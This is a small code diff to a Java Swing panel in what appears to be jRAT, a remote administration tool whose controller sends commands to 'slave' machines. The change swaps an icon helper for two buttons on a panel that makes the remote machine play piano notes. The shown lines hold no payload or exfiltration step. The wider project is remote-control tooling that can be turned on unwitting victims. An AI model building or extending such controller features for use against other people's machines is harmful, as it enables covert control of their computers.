@@ -1,6 +1,6 @@
 package jrat.controller.ui.panels;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.common.Piano;
 import jrat.controller.ErrorDialog;
 import jrat.controller.Slave;
@@ -197,7 +197,7 @@ public class PanelControlPiano extends PanelControlParent {
 				slave.addToSendQueue(new Packet67LongPianoNote((Integer) spinnerSound.getValue(), (Integer) spinnerSec.getValue()));
 			}
 		});
-		btnSend.setIcon(IconUtils.getIcon("arrow-right"));
+		btnSend.setIcon(Resources.getIcon("arrow-right"));
 
 		JButton btnTest = new JButton("Test");
 		btnTest.addActionListener(new ActionListener() {
@@ -215,7 +215,7 @@ public class PanelControlPiano extends PanelControlParent {
 				}
 			}
 		});
-		btnTest.setIcon(IconUtils.getIcon("sound"));
+		btnTest.setIcon(Resources.getIcon("sound"));
 		GroupLayout gl_panel_1 = new GroupLayout(panel_1);
 		gl_panel_1.setHorizontalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addGroup(gl_panel_1.createSequentialGroup().addContainerGap().addComponent(lblSound).addPreferredGap(ComponentPlacement.RELATED).addComponent(spinnerSound, GroupLayout.PREFERRED_SIZE, 61, GroupLayout.PREFERRED_SIZE).addGap(18).addComponent(lblSeconds).addPreferredGap(ComponentPlacement.RELATED).addComponent(spinnerSec, GroupLayout.PREFERRED_SIZE, 68, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, 22, Short.MAX_VALUE).addComponent(btnTest).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSend).addContainerGap()));
 		gl_panel_1.setVerticalGroup(gl_panel_1.createParallelGroup(Alignment.LEADING).addGroup(gl_panel_1.createSequentialGroup().addContainerGap().addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE).addComponent(lblSound).addComponent(spinnerSound, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblSeconds).addComponent(spinnerSec, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addContainerGap(29, Short.MAX_VALUE)).addGroup(Alignment.TRAILING, gl_panel_1.createSequentialGroup().addContainerGap(26, Short.MAX_VALUE).addGroup(gl_panel_1.createParallelGroup(Alignment.BASELINE).addComponent(btnSend).addComponent(btnTest)).addContainerGap()));
